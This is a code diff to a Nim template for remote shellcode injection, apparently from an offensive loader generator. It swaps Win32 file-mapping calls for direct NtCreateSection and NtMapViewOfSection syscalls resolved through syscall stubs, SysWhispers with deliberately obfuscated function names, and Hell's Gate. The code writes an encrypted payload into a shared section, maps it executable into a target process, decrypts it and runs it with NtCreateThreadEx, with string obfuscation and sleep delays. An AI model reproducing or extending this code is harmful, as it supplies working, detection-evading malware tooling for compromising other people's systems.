@@ -22,61 +22,76 @@ let ShellcodeRemoteInjectMapSection * = """
         
             var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
             var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+            var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtCreate) + cast[HANDLE](SYSCALL_STUB_SIZE)
+            var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtCreateSection) + cast[HANDLE](SYSCALL_STUB_SIZE)
 
             # define NtOpenProcess
             var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
             # define NtWriteVirtualMemory
             let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
             # define NtCreateThreadEx
             let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+            
+            # define NtCreateSection
+            let NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
+            VirtualProtect(cast[LPVOID](syscallStub_NtCreateSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+            # define NtMapViewOfSection
+            let NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
+            VirtualProtect(cast[LPVOID](syscallStub_NtMapViewOfSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
             success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
             success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
             success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
+            success = GetSyscallStub("NtCreateSection", cast[LPVOID](syscallStub_NtCreateSection))
+            success = GetSyscallStub("NtMapViewOfSection", cast[LPVOID](syscallStub_NtMapViewOfSection))
+        
         when defined(SysWhispers):
             status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
             when defined(verbose):
                 echo obf("[*] NtOpenProcess: "), toHex(status)
 
-            var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
+                        # NtCreateSection Call
 
-            if (hMapFile == 0):
-                echo obf("[-] Failed to create file mapping")
-                echo GetLastError()
-            
-            proc MapViewOfFile3(
-                FileMapping: HANDLE,
-                Process: HANDLE,
-                BaseAddress: PVOID,
-                Offset: ULONG,
-                ViewSize: SIZE_T,
-                AllocationType: ULONG ,
-                PageProtection: ULONG,
-                ExtendedParameters: PVOID,
-                ParameterCount: ULONG
-            ): LPVOID {.stdcall, dynlib: "kernelbase.dll", importc: "MapViewOfFile3", discardable.}
+            var 
+                hMapFile: HANDLE
+                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
 
-            var lpMapAddress: LPVOID = MapViewOfFile3(hMapFile, GetCurrentProcess(), nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
+            when defined(verbose):
+                echo obf("[*] NtCreateSection: "), toHex(status)
+
+            var
+                lpMapAddress: PVOID = NULL
+                vSize: SIZE_T = sc_size
+            # NtMapViewOfSection Call local
+            status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+
+            when defined(verbose):
+                echo obf("[*] NtMapViewOfSection: "), toHex(status)
             if (lpMapAddress == nil):
                 echo obf("[-] Failed to map view of file")
                 echo GetLastError()
 
             
             var bytesWritten: SIZE_T
-
+            # NtWriteVirtualMemory Call
             status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
 
             when defined(verbose):
                 echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
-            var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+            var lpMapAddressRemote: PVOID = NULL
+            # NtMapViewOfSection Call remote
+            status = uihzasdbnqlpoasdlykxc(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
                 echo GetLastError()
@@ -106,40 +121,54 @@ let ShellcodeRemoteInjectMapSection * = """
                 echo obf("[*] NtOpenProcess: "), toHex(status)
         
             when defined(Hellsgate):
-                if getSyscall(ntCreateTable):
-                    syscall = ntCreateTable.wSysCall
+                if getSyscall(ntCreateSectionTable):
+                    syscall = ntCreateSectionTable.wSysCall
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
-            var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
+                        echo obf("[-] Failed to find opcode for NtCreateSection")
+            
+            # NtCreateSection Call
 
+            var 
+                hMapFile: HANDLE
+                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
+
+            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
+            when defined(verbose):
+                echo obf("[*] NtCreateSection: "), toHex(status)
+            #var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)            
+            
             if (hMapFile == 0):
                 echo obf("[-] Failed to create file mapping")
                 echo GetLastError()
             
-            proc MapViewOfFile3(
-                FileMapping: HANDLE,
-                Process: HANDLE,
-                BaseAddress: PVOID,
-                Offset: ULONG,
-                ViewSize: SIZE_T,
-                AllocationType: ULONG ,
-                PageProtection: ULONG,
-                ExtendedParameters: PVOID,
-                ParameterCount: ULONG
-            ): LPVOID {.stdcall, dynlib: "kernelbase.dll", importc: "MapViewOfFile3", discardable.}
+            when defined(Hellsgate):
+                if getSyscall(ntMapViewOfSectionTable):
+                    syscall = ntMapViewOfSectionTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+            
+            var
+                lpMapAddress: PVOID = NULL
+                vSize: SIZE_T = sc_size
 
-            var lpMapAddress: LPVOID = MapViewOfFile3(hMapFile, GetCurrentProcess(), nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+            status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+
+            when defined(verbose):
+                echo obf("[*] NtMapViewOfSection: "), toHex(status)
+
             if (lpMapAddress == nil):
                 echo obf("[-] Failed to map view of file")
                 echo GetLastError()
-
+         
             when defined(Hellsgate):
                 if getSyscall(ntWriteTable):
                     syscall = ntWriteTable.wSysCall
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            
             var bytesWritten: SIZE_T
             status = NtWriteVirtualMemory(
                 pHandle2, 
@@ -147,8 +176,17 @@ let ShellcodeRemoteInjectMapSection * = """
                 unsafeAddr friendlycode, 
                 sc_size, 
                 addr bytesWritten)
+            
+            when defined(Hellsgate):
+                if getSyscall(ntMapViewOfSectionTable):
+                    syscall = ntMapViewOfSectionTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
 
-            var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+            var lpMapAddressRemote: PVOID = NULL
+            status = NtMapViewOfSection(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
                 echo GetLastError()
@@ -156,6 +194,12 @@ let ShellcodeRemoteInjectMapSection * = """
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
             ptrEncText = cast[ptr byte](lpMapAddress)
             ptrDecText = cast[ptr byte](lpMapAddress)
+            when defined(Hellsgate):
+                if getSyscall(ntCreateTable):
+                    syscall = ntCreateTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
             decryptlate()
             status = NtCreateThreadEx(
                 &tHandle, 
